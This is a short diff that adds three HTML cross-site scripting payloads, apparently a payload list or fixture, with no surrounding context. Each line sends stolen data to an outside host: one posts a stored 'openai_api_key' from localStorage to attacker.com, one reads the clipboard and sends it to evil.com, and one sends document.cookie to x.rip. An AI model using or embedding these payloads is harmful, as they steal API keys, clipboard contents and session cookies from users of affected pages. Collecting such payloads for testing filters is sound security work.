@@ -1,0 +1,3 @@
+<textarea autofocus onfocus="fetch('https://attacker.com/key='+localStorage.getItem('openai_api_key'))"></textarea>
+<svg/onload="navigator.clipboard.readText().then(txt=>fetch('https://evil.com/c/'+btoa(txt)))">
+<details ontoggle="fetch('https://x.rip/t/'+document.cookie)">
